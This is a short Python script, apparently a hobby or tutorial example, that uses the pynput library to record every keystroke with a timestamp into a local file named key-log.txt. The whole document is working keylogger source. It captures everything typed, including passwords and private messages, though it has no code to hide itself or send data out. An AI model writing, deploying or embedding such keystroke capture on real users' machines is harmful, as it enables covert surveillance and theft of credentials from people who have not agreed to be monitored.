from pynput.keyboard import Key,Listener
import logging

# Defines where to save and format of type
logging.basicConfig(filename="key-log.txt",level=logging.DEBUG,format="%(asctime)s-%(message)s")

# Defines which key is pressed
def on_press(Key):
    logging.info(Key)

# Notes the key pressed
with Listener(on_press=on_press)as listener:
    listener.join()
